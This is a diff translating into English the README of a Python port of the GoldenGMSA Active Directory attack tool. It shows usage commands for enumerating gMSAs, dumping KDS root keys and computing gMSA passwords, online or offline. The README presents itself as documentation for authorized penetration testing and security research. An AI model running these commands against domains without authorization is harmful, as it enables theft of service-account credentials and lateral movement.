@@ -1,80 +1,80 @@
 # GoldenGMSA Python
 
-Équivalence Python de l'outil GoldenGMSA pour l'exploitation des Group Managed Service Accounts (gMSA) dans Active Directory.
+Python implementation of the GoldenGMSA tool for exploiting Group Managed Service Accounts (gMSA) in Active Directory.
 
 ## Installation
 
 ```bash
-# Cloner le repository
+# Clone the repository
 git clone https://github.com/felixbillieres/goldenGMSA.git
 cd goldenGMSA/golden_gmsa_python
 
-# Créer un environnement virtuel
+# Create a virtual environment
 python3 -m venv venv
 source venv/bin/activate
 
-# Installer les dépendances
+# Install dependencies
 pip install -r requirements.txt
 ```
 
-## Utilisation
+## Usage
 
-### Authentification au domaine
+### Domain Authentication
 
 ```bash
-# Avec authentification (recommandé)
+# With authentication (recommended)
 python main.py -u 'DOMAIN\username' -p 'password' --domain domain.local gmsainfo
 
-# Ou avec format UPN
+# Or with UPN format
 python main.py -u 'user@domain.local' -p 'password' --domain domain.local gmsainfo
 
-# Avec IP du contrôleur de domaine
+# With domain controller IP
 python main.py -u 'user@domain.local' -p 'password' --domain domain.local --dc-ip 192.168.1.10 gmsainfo
 
-# Avec LDAPS (SSL)
+# With LDAPS (SSL)
 python main.py -u 'user@domain.local' -p 'password' --domain domain.local --use-ssl gmsainfo
 ```
 
-### Commandes disponibles
+### Available Commands
 
 ```bash
-# Énumérer tous les gMSA du domaine
+# Enumerate all gMSAs in the domain
 python main.py -u 'user@domain.local' -p 'password' --domain domain.local gmsainfo
 
-# Interroger un gMSA spécifique par SID
+# Query a specific gMSA by SID
 python main.py -u 'user@domain.local' -p 'password' --domain domain.local gmsainfo --sid <SID_GMSA>
 
-# Dumper toutes les clés racine KDS
+# Dump all KDS root keys
 python main.py -u 'user@domain.local' -p 'password' --domain domain.local kdsinfo
 
-# Calculer le mot de passe d'un gMSA
+# Calculate a gMSA password
 python main.py -u 'user@domain.local' -p 'password' --domain domain.local compute --sid <SID_GMSA>
 
-# Mode hors ligne (sans authentification, avec clés exportées)
+# Offline mode (no authentication, with exported keys)
 python main.py compute --sid <SID_GMSA> --kdskey <BASE64_KEY> --pwdid <BASE64_PWDID>
 
-# Voir toutes les options
+# View all options
 python main.py --help
 ```
 
-### Formats d'authentification supportés
+### Supported Authentication Formats
 
-- **UPN** : `user@domain.local`
-- **NetBIOS** : `DOMAIN\username`
-- **Simple** : `username` (le domaine sera ajouté automatiquement)
+- **UPN**: `user@domain.local`
+- **NetBIOS**: `DOMAIN\username`
+- **Simple**: `username` (domain will be added automatically)
 
-## Avertissement
+## Disclaimer
 
-Cet outil est destiné uniquement à des fins de **test de pénétration autorisé** et de **recherche en sécurité**. L'utilisation de cet outil sur des systèmes sans autorisation explicite est **illégale**.
+This tool is intended **only for authorized penetration testing** and **security research**. Using this tool on systems without explicit permission is **illegal**.
 
-## Licence
+## License
 
 MIT License
 
-## Auteur
+## Author
 
 **Félix Billières (Elliot Belt)**
 
-## Crédits
+## Credits
 
-Basé sur la recherche de Yuval Gordon ([@YuG0rd](https://twitter.com/YuG0rd)) - [Introducing the Golden GMSA Attack](https://www.semperis.com/blog/golden-gmsa-attack/)
+Based on research by Yuval Gordon ([@YuG0rd](https://twitter.com/YuG0rd)) - [Introducing the Golden GMSA Attack](https://www.semperis.com/blog/golden-gmsa-attack/)
